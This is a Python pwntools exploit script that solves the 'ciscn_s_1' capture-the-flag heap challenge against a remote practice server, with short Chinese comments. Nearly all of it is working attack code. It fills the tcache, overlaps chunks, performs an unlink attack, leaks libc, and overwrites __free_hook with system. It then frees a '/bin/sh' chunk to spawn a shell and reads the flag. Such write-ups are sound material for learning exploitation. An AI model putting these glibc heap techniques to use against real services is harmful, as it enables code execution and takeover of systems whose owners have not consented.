# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_s_1'
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25221'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def exhaust( pwn ):
    while 1 :
        try:
            pwn()
        except:
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('4.show',num)

def add(id,size,text):
    cmd(1)
    sla("index:",id)
    sla("size:",size)
    ru("gift: ")
    addr = rint(7)
    sla("content:",text)
    return addr

def edit(id,text):
    cmd(3)
    sla("index:",id)
    sa("content:",text)

def delete(id):
    cmd(2)
    sla("index:",id)

def show(id):
    cmd(4)
    sla("index:",id)

one_gad = one_gadget(libc.path)

ptr_list = 0x6020e0
fake_ptr = 0x602190
key = 0x6022B8
heap_addr = add(0,0xf8,"a") -0x260
lg("heap_addr",heap_addr)

for i in range(1,7):
    add(i,0xf8,"a")
#填充tcache用

add(7,0xf8,"a")
add(8,0x98,"a")
add(9,0x98,"a")
add(10,0x98,"a")
add(11,0x88,"a")
add(12,0xf8,"a")
#构建比较多的可控堆块，方便后期堆重叠利用

add(22,0x98,"a")
add(23,0xf8,"a")
#为ulink做准备的两个堆块

add(13,0x88,"a")
#防合并

for i in range(7):
    delete(i)

delete(7)
payload = "\x00"*0x80 + p64(0x100 + 0xa0 *3 + 0x90 )
edit(11,payload)

delete(12)
add(14,0xe8,"a")
add(15,0xa8,"a")

add(16,0x98,"a")
add(17,0x98,"a")

delete(16)
delete(17)

edit(10,p64(key) )

add(18,0x98,"a")
add(19,0x98,p64(0x300000001))
#堆重叠造成 double_free 改写 tcache 指向 key 并修改之


add(20,0x88,"a")
add(21,0x88,"a")
#本来是想在这里再做个 double_free 的，后来发现根本不用

payload  = p64(0) +p64(0x80)
payload += p64(fake_ptr - 0x18) + p64(fake_ptr - 0x10)
payload += "\x00"*0x60
payload += p64(0x80) + p64(0)
payload += p64(0x90)

edit(22,payload)
delete(23)
#unlink操作用户堆指针

payload = p64(heap_addr + 0xd60) + p64(heap_addr + 0xc0)
edit(22,payload)
#unlink泄露libc，打tcache堆管理块

#dbg()

show(19)
__malloc_hook = l64() - 0x70
lg("__malloc_hook",__malloc_hook)

libc.address = __malloc_hook - libc.sym["__malloc_hook"]
system = libc.sym["system"]
__free_hook = libc.sym["__free_hook"]

edit(20,p64(__free_hook))

add(0,0xf8,p64(system))
add(1,0xd8,"/bin/sh\x00")
delete(1)

sleep(0.3)
sl("cat flag")

p.interactive()

'''
@File    :   ciscn_s_1.py
@Time    :   2021/08/10 14:14:24
@Author  :   Niyah 
'''